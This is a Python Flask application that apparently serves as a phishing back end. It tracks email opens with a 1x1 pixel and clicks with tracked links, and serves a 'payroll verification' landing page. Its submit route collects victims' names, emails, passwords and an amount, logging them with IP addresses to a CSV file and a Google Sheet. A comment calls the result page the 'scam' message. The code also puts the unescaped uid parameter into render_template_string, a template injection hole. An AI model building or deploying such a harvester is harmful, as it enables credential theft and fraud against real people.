from flask import Flask, request, send_file, make_response, render_template_string, redirect, url_for
import csv
import os
import json
from datetime import datetime
import gspread
from oauth2client.service_account import ServiceAccountCredentials

app = Flask(__name__)

LOG_FILE = "logs/events.csv"
LANDING_PAGE = "landing_page.html"
GOOGLE_SHEET_ID = "1hALSUrXjg_qcru93HeSjlbalYr04sFMtLz6xzGR8nvU"

# Setup Google Sheets client
scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
creds_json = os.environ.get("GOOGLE_CREDS")
creds_dict = json.loads(creds_json)
creds = ServiceAccountCredentials.from_json_keyfile_dict(creds_dict, scope)
client = gspread.authorize(creds)
sheet = client.open_by_key(GOOGLE_SHEET_ID).sheet1

def append_to_google_sheet(row):
    sheet.append_row(row)

def log_event(event_type, uid, extra_data=None):
    timestamp = datetime.now().isoformat()
    ip = request.remote_addr
    user_agent = request.user_agent.string
    row = [user_agent, event_type, uid, ip, timestamp]
    if extra_data:
        # Flatten extra data dictionary into string key=value pairs
        extras = " | ".join(f"{k}={v}" for k,v in extra_data.items())
        row.append(extras)
    else:
        row.append("")
    os.makedirs("logs", exist_ok=True)
    with open(LOG_FILE, "a", newline="") as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(row)
    append_to_google_sheet(row)

@app.route("/track")
def track():
    uid = request.args.get("uid", "UNKNOWN")
    log_event("click", uid)
    # Redirect user to landing page instead of serving static file, so URL stays clean
    return redirect(url_for("landing", uid=uid))

@app.route("/landing")
def landing():
    uid = request.args.get("uid", "UNKNOWN")
    # Render the landing page with uid embedded, so the form submission knows who submitted
    with open(LANDING_PAGE, "r") as f:
        html = f.read()
    # Inject uid into the form (you can add a hidden input)
    html = html.replace("</form>", f'<input type="hidden" name="uid" value="{uid}" /></form>')
    return render_template_string(html)

@app.route("/submit", methods=["POST"])
def submit():
    uid = request.form.get("uid", "UNKNOWN")
    name = request.form.get("name")
    email = request.form.get("email")
    password = request.form.get("password")
    amount = request.form.get("amount")

    extra_data = {
        "name": name,
        "email": email,
        "password": password,
        "amount": amount
    }
    log_event("form_submit", uid, extra_data)
    # After submission, show the "scam" message or thank you page
    return """
    <h1>Thank you!</h1>
    <p>Your payroll verification has been received.</p>
    """

@app.route("/open")
def open_pixel():
    uid = request.args.get("uid", "UNKNOWN")
    log_event("email_open", uid)
    # Return a 1x1 transparent GIF pixel
    pixel = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
    response = make_response(pixel)
    response.headers.set("Content-Type", "image/gif")
    response.headers.set("Cache-Control", "no-cache, no-store, must-revalidate")
    return response

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port)
